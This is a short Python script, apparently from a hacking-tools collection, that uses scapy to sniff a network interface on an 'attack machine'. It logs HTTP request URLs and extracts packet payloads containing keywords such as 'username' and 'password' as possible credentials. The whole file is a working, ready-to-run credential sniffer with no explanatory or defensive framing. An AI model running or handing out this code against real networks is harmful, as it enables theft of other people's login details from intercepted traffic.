#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="iface", help="Interface to use on attack machine")
    args = parser.parse_args()
    if not args.iface:
        print("\nMust specify an interface.  Please type 'arpSpoof -h' for guidance on this utility.  Exiting program...\n")
        exit()
    else:
        return args

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processSniffedPkt)

def getUrl(pkt):
    return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

def getLoginInfo(pkt):
    if pkt.haslayer(scapy.Raw):
        load = str(pkt[scapy.Raw].load)
        keywords = ["uname", "username", "password", "login", "logon", "user", "pass"]
        for key in keywords:
            if key in load:
                return load

def processSniffedPkt(pkt):
    if pkt.haslayer(http.HTTPRequest):
        url = getUrl(pkt)
        print("[+] HTTP Request >> " + url.decode())

        loginInfo = getLoginInfo(pkt)
        if loginInfo:
            print("\n\n[+] Possible username/password > " + loginInfo + "\n\n")

opt = getArgs()
sniff(opt.iface)